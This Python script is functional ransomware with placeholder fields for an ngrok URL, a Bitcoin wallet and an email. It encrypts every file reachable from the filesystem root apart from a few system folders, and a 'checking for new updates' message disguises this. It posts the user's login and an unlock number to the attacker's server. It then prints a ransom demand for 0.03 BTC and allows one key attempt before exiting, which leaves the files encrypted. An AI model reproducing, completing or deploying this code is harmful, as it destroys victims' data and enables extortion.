import os
from cryptography.fernet import Fernet
import random
from datetime import datetime
import requests as r
import json

key = Fernet.generate_key()
fernetEncrypt = Fernet(key)

decryptPlease = random.randint(100000, 999999)


url = "YOUR_NGROK_URL_HERE"
BTC = "YOUR_BTC_WALLET_HERE"
EMAIL = "YOUR_EMAIL_HERE"

fileList = []

EXCLUDED_DIRS = [   "/Windows",
                    "/Program Files",
                    "/Program Files (x86)",
                    "/AppData"
                ]


def sendKeys():
    id = str(datetime.now().time()).strip().replace(':', '').replace('.', '')
    user = os.getlogin()
    key = decryptPlease

    jsonFormat = {
        "uniqueId": id,
        "user": user,
        "key": key
    }

    r.post(url, data=json.dumps(jsonFormat))

def findFiles():
    print("Please be patient, checking for new updates...\n\n")
    for root, dir, file in os.walk('/'):
        for i in range(len(EXCLUDED_DIRS)):
            if EXCLUDED_DIRS[i] in root:
                break
            else:
                if i == len(EXCLUDED_DIRS) - 1:
                    for files in file:
                        files = os.path.join(root, files)
                        encrypt(files)
    os.system("cls" if os.name == 'nt' else "clear")

def encrypt(file):
    flag = 0
    try:
        with open(file, "rb") as f:
            data = f.read()
            encryptedData = fernetEncrypt.encrypt(data)
            fileList.append(file)
    except:
        flag = 1
    if flag == 0:
        try:
            with open (file, "wb") as f:
                f.write(encryptedData)
        except:
            a = "error" # just to fill the except block

def warningScreen():
    print("DO NOT CLOSE THIS WINDOW, OR ELSE ALL YOUR FILES WILL BE FOREVER ENCRYPTED!!\n\nWe won't be able to help you out then :(\n\n")
    print(f"If you wish to decrypt your file, send us 0.03 BTC at {BTC} and email us at {EMAIL} the unique key provided to you with the proof that you have paid the ransom. Then only we will provide the key which will decrypt the files")
    print("\n\nRemember, you will be given only ONE CHANCE to enter the correct key:\n\n")
    x = int(input("\tDecryption key: "))
    if x == decryptPlease:
        decrypt()
    else:
        exit()

def decrypt():
    for files in fileList:
        flag = 0
        try:
            with open(files, "rb") as f:
                data = f.read()
        except:
            flag = 1
        if flag == 0:
            try:
                with open(files, "wb") as f:
                    decryptedData = fernetEncrypt.decrypt(data)
                    f.write(decryptedData)
            except:
                a = "error" # just to fill the except block
        
if __name__ == "__main__":
    
    sendKeys()
    findFiles()
    warningScreen()